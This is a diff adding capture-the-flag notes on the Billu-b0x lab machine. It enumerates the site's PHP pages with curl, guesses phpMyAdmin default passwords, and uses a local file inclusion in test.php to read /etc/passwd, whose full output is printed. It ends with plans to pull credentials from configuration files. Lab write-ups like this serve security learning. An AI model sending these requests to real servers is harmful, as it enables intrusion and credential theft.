@@ -239,3 +239,140 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/08/17 01:52:31 Finished
 ===============================================================
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/add.php
+<form  method="post" enctype="multipart/form-data">
+    Select image to upload:
+    <input type="file" name=image>
+	<input type=text name=name value="name">
+	<input type=text name=address value="address">
+	<input type=text name=id value=1337 >
+    <input type="submit" value="upload" name="upload">
+</form>
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/c.php
+
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/head.php
+
+<html>
+<head>
+<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
+</script>
+<title>--==[[IndiShell Lab]]==--</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<STYLE>
+</STYLE>
+<script type="text/javascript">
+<!--
+    function lhook(id) {
+       var e = document.getElementById(id);
+       if(e.style.display == 'block')
+          e.style.display = 'none';
+       else
+          e.style.display = 'block';
+    }
+//-->
+</script>
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/in.php
+PHP info:
+...
+PHP Version 5.3.10-1ubuntu3.26
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/show.php
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists# curl -X GET http://Billu-b0x.ctf/test.php
+'file' parameter is empty. Please provide file path in 'file' parameter
+
+=>
+add.php: Upload file?
+test.php: LFI vulnerability (possibly)
+c.php: Unknown yet
+show.php: Unknown yet
+head.php, index.php, panel.php: Homepage
+in.php: PHP Info Page
+/phpmy: http://billu-b0x.ctf/phpmy/index.php?token=31706723f554426d18b5048016d45b54 => phpMyAdmin
+/images: Some uploaded images
+/uploaded_images: Some uploaded images
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+http://billu-b0x.ctf/phpmy/index.php?token=75b10cb4cde8b583ad0b17dc519dc39a
+test: root / NULL => fail, root / root => fail
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+So we know test.php is vulnerable to LFI
+=>
+root@Blue3:/media/Linux-Storage/[Github]/eblue3# curl -X POST --data "file=/etc/passwd" http://Billu-b0x.ctf/test.php
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:106::/var/run/dbus:/bin/false
+whoopsie:x:104:107::/nonexistent:/bin/false
+landscape:x:105:110::/var/lib/landscape:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
+
+=> SUCCESS
+=> So now we can check:
+- configuration for credentials
+- content of c.php and show.php and other files
+- according to: https://docs.phpmyadmin.net/en/latest/config.html => phpMyAdmin configuration is placed at ./config.inc.php
